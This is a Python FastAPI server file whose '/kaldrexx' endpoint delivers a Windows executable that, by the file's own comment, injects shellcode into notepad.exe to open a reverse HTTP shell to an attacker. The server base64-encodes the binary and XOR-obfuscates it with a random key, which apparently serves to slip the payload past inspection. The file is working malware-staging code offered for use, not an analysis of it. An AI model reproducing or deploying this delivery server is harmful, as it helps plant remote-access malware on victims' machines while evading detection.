from fastapi import FastAPI
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
import base64
import random

app = FastAPI()

# Mount the static directory to serve CSS file
app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/")
def read_root():
    return FileResponse("static/index.html", media_type="text/html")

# Kaldrexx is a simple executable file that utilizes CreateRemoteThread to inject a shellcode into a process(notepad.exe in this case)
# to connect to the attacker's remote server as a reverse HTTP shell. Refer to https://github.com/KnightChaser/kaldrexx for more details.
@app.get("/kaldrexx")
def read_kaldrexx():
    # Load static/kaldrexx.exe and serve it after converting to BASE64
    try:
        with open("static/kaldrexx.exe", "rb") as kaldrexx:
            executableBinary = kaldrexx.read()
            executableBase64Encoded = base64.b64encode(executableBinary).decode("utf-8")
            randomCyclicXORKey = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(2048))
            return {"executableEncrypted": stringCyclicXOR(executableBase64Encoded, randomCyclicXORKey), 
                    "key": randomCyclicXORKey}
    except FileNotFoundError:
        return {"error": "File not found"}
    except Exception as e:
        return {"error": f"An error occurred: {e}"}

# XOR the string with the key in a cyclic manner
def stringCyclicXOR(string:str, key:str) -> str:
    cyclicKey:str = key * (len(string) // len(key)) + key[:len(string) % len(key)]
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(string, cyclicKey))
